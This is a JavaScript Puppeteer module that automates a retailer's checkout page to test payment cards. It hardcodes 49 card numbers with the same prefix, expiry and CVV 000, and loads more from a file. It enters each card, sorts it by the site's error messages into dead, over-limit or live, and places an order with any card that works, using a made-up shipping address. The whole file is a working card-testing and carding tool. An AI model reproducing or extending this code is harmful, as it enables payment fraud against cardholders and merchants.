import { FILE_CI, TIMEOUT_REQUEST_PAGE } from "../utils/contants.js";
import { getDataToFile, removeStringFromFile } from "../utils/file.js";
import { formatCard, getFirstChar } from "../utils/formater.js";
import { delay, pickAndRemove } from "../utils/helpers.js";
import {
  checkElementExits,
  checkXpathExits,
  clickByXPath,
  clickElement,
  enterKey,
  typeText,
} from "./utils/helpers.js";

const listCi = [
  "4744760308052408|03|2028|000",
  "4744760308057720|03|2028|000",
  "4744760308056334|03|2028|000",
  "4744760308054511|03|2028|000",
  "4744760308056862|03|2028|000",
  "4744760308058744|03|2028|000",
  "4744760308056573|03|2028|000",
  "4744760308052101|03|2028|000",
  "4744760308050113|03|2028|000",
  "4744760308051004|03|2028|000",
  "4744760308054248|03|2028|000",
  "4744760308052531|03|2028|000",
  "4744760308058405|03|2028|000",
  "4744760308051749|03|2028|000",
  "4744760308054131|03|2028|000",
  "4744760308055856|03|2028|000",
  "4744760308058371|03|2028|000",
  "4744760308054289|03|2028|000",
  "4744760308053083|03|2028|000",
  "4744760308058736|03|2028|000",
  "4744760308058462|03|2028|000",
  "4744760308056839|03|2028|000",
  "4744760308058447|03|2028|000",
  "4744760308052275|03|2028|000",
  "4744760308056722|03|2028|000",
  "4744760308051848|03|2028|000",
  "4744760308051830|03|2028|000",
  "4744760308058181|03|2028|000",
  "4744760308057522|03|2028|000",
  "4744760308054560|03|2028|000",
  "4744760308054370|03|2028|000",
  "4744760308058884|03|2028|000",
  "4744760308050626|03|2028|000",
  "4744760308051418|03|2028|000",
  "4744760308058611|03|2028|000",
  "4744760308056433|03|2028|000",
  "4744760308051129|03|2028|000",
  "4744760308053711|03|2028|000",
  "4744760308058058|03|2028|000",
  "4744760308057043|03|2028|000",
  "4744760308053125|03|2028|000",
  "4744760308050873|03|2028|000",
  "4744760308054750|03|2028|000",
  "4744760308052234|03|2028|000",
  "4744760308058645|03|2028|000",
  "4744760308051822|03|2028|000",
  "4744760308051319|03|2028|000",
  "4744760308053679|03|2028|000",
  "4744760308057357|03|2028|000",
];
const DOM_CHECKOUT = {
  SHIPPING_HEADER: "#shipping-card-header",
  HAS_ADDRESS: '#shipping-card-header i[data-testid="icon-CheckCircleFill"]',
  FORM_ADDRESS: "form#add-edit-address-form",
  FIRSTNAME: 'input[name="firstName"]',
  LASTNAME: 'input[name="lastName"]',
  PHONE: 'input[name="phone"]',
  STREET_ADDRESS: "#addressLineOne",
  APT: 'input[name="addressLineTwo"]',
  CITY: 'input[name="city"]',
  STATE: 'select[name="state"]',
  NO_TKS_WM: '//button[contains(text(), "No thanks")]',
  ZIP: 'input[name="postalCode"]',
  BUTTON_NO_SAVE: "//button[contains(text(), 'No, save')]",
  I_AGREE: "#subscription-terms-field",
  PAYMENT_FORM: "form#single-form-add-payment",
  CC_NUMBER: "#cc-number",
  MONTH: 'select[autocomplete="cc-exp-month"]',
  YEAR: 'select[autocomplete="cc-exp-year"]',
  CVV: 'input[name="cvv"]',
  CHANGE_PAYMENT: 'button[data-testid="edit-payment-button"]',
  CLOSE_DIALOG_CHANGE_PAYMENT:
    'button[aria-label="close change payment panel"]',
  DIALOG_FORM_PAYMENT: 'div[role="dialog"] #single-form-add-payment',
  DELETE_CARD: 'button[data-automation-id="delete"]',
  EXPIRATION_CVV:
    "//span[contains(text(), 'CVV and expiration date and try again')]",
  PLEASE_ENTER_CVV: '//span[contains(text(), "warning:")]',
  ADDCARD_SUCCESS:
    '#payments-card-header i[data-testid="icon-CheckCircleFill"]',
  ERROR_CARD_AUTH: 'div[aria-label="Error"]',
  SUBMIT_PAYMENT: '[form="single-form-add-payment"]',
  CONTINUE: '//button[contains(text(), "Continue")]',
  NO_ADD_PAYMENT:
    "//*[contains(text(), 'Your card could not be saved. Please use a different payment method')]",
  BUTTON_ORDER_PLACE: 'button[data-automation-id="place-order-button"]',
};
const checkoutProcess = async (page, info) => {
  try {
    await clickByXPath(page, DOM_CHECKOUT.NO_TKS_WM);
    const isEnterAddress = await addAddress(page, info);
    if (!isEnterAddress) {
      return { status: false, email: "", ci: null };
    }
    await acceptMoveOn(page);
    let card;
    let cardInfo;
    let status = "CVV_ERROR";
    const dataCI = await getDataToFile(FILE_CI);
    while (
      status === "CVV_ERROR" ||
      status === "RE_ENTER" ||
      status === "LIMIT_MONEY"
    ) {
      await delay(4);
      card = pickAndRemove(dataCI);
      cardInfo = formatCard(card, "|");
      await enterCardInfo(page, cardInfo);
      status = await checkCVVLive(page);
      switch (status) {
        case "RE_ENTER":
          removeStringFromFile(FILE_CI, card);
          await clickElement(page, DOM_CHECKOUT.CHANGE_PAYMENT, 25);
          await removeCard(page);
          await acceptMoveOn(page);
          continue;
        case "CVV_ERROR":
          removeStringFromFile(FILE_CI, card);
          continue;
        case "NO_ADD":
          break;
        case "SUCCESS":
          await clickElement(page, DOM_CHECKOUT.BUTTON_ORDER_PLACE, 25);
          const { isShow } = await checkElementExits(
            page,
            DOM_CHECKOUT.ERROR_CARD_AUTH,
            15
          );
          if (isShow) {
            status = "LIMIT_MONEY";
            removeStringFromFile(FILE_CI, card);
            await removeCard(page);
            await acceptMoveOn(page);
            continue;
          }
          break;
      }
    }
    if (status === "SUCCESS") {
      return { status: true, email: info.email, ci: card };
    } else if (status === "NO_ADD") {
      return { status: false, email: "", ci: card };
    }
  } catch (error) {
    console.error(error);
  }
  return { status: false, email: "", ci: null };
};

const removeCard = async (page) => {
  await clickElement(page, DOM_CHECKOUT.DELETE_CARD, 25);
  const elements = await page.$$(
    `::-p-xpath(//button[contains(text(), "Confirm")])`
  );
  if (elements.length === 0) {
    return false;
  }
  const btnRemove = elements[1];
  await btnRemove.click();
  await page.reload({
    waitUntil: ["domcontentloaded"],
    timeout: TIMEOUT_REQUEST_PAGE,
  });
  return true;
};

const enterCardInfo = async (page, infoCard, parent) => {
  let ccNumber = DOM_CHECKOUT.CC_NUMBER;
  let month = DOM_CHECKOUT.MONTH;
  let year = DOM_CHECKOUT.YEAR;
  let cvv = DOM_CHECKOUT.CVV;
  if (parent) {
    ccNumber = `${parent} ${DOM_CHECKOUT.CC_NUMBER}`;
    month = `${parent} ${DOM_CHECKOUT.MONTH}`;
    year = `${parent} ${DOM_CHECKOUT.YEAR}`;
    cvv = `${parent} ${DOM_CHECKOUT.CVV}`;
  }
  await typeText(page, ccNumber, infoCard.numberCi);
  const { isShow } = await checkElementExits(page, month, 25);
  if (!isShow) {
    return false;
  }
  await page.select(DOM_CHECKOUT.MONTH, infoCard.month);
  await page.select(year, infoCard.year);
  await page.evaluate(() => {
    const inputElement = document.querySelector('input[name="cvv"]');
    if (inputElement) {
      inputElement.setAttribute("maxlength", "4");
    }
  });
  await typeText(page, cvv, infoCard.cvv);
  await delay(5);
  if (parent) {
    await clickElement(page, DOM_CHECKOUT.SUBMIT_PAYMENT);
  } else {
    await clickByXPath(page, DOM_CHECKOUT.CONTINUE);
  }
};

const checkCVVLive = async (page) => {
  const { isShow: pleaseEnterCard } = await checkXpathExits(
    page,
    DOM_CHECKOUT.PLEASE_ENTER_CVV,
    10
  );
  if (pleaseEnterCard) {
    console.log("Please Enter CVV");
    return "RE_ENTER";
  }
  const check = await Promise.race([
    checkXpathExits(page, DOM_CHECKOUT.EXPIRATION_CVV, 15),
    checkXpathExits(page, DOM_CHECKOUT.NO_ADD_PAYMENT, 15),
    checkElementExits(page, DOM_CHECKOUT.ADDCARD_SUCCESS, 15),
  ]);

  switch (check.selector) {
    case DOM_CHECKOUT.EXPIRATION_CVV:
      console.log("CVV Expiration Date Error");
      return "CVV_ERROR";
    case DOM_CHECKOUT.NO_ADD_PAYMENT:
      console.log("NO add card");
      return "NO_ADD";
    case DOM_CHECKOUT.ADDCARD_SUCCESS:
      console.log("Success");
      return "SUCCESS";
    default:
      break;
  }
};

const enterFormAddress = async (page, info) => {
  await typeText(page, DOM_CHECKOUT.FIRSTNAME, info.firstName);
  await typeText(page, DOM_CHECKOUT.LASTNAME, info.lastName);
  await typeText(
    page,
    DOM_CHECKOUT.STREET_ADDRESS,
    `24${getFirstChar(info.firstName)}${getFirstChar(
      info.lastName
    )} Holly Road #${info.firstName}`
  );
  await typeText(page, DOM_CHECKOUT.APT, "apt 0");
  await typeText(page, DOM_CHECKOUT.CITY, "Ronkonkoma");
  await page.select(DOM_CHECKOUT.STATE, "NY");
  await typeText(page, DOM_CHECKOUT.ZIP, "11779");
  await typeText(page, DOM_CHECKOUT.PHONE, info.phone);
  await delay(1);
  await enterKey(page);
  await delay(2);
  await clickByXPath(page, DOM_CHECKOUT.BUTTON_NO_SAVE, 15);
};

const acceptMoveOn = async (page) => {
  await clickElement(page, DOM_CHECKOUT.I_AGREE, 25);
};

const addAddress = async (page, info) => {
  const check = await Promise.race([
    checkElementExits(page, DOM_CHECKOUT.FORM_ADDRESS, 25),
    checkElementExits(page, DOM_CHECKOUT.HAS_ADDRESS, 25),
  ]);
  let success = true;
  switch (check.selector) {
    case DOM_CHECKOUT.FORM_ADDRESS:
      await enterFormAddress(page, info);
      await delay(1);
      break;
    case DOM_CHECKOUT.HAS_ADDRESS:
      success = false;
      break;
    default:
      success = false;
      break;
  }

  return success;
};

export { checkoutProcess };
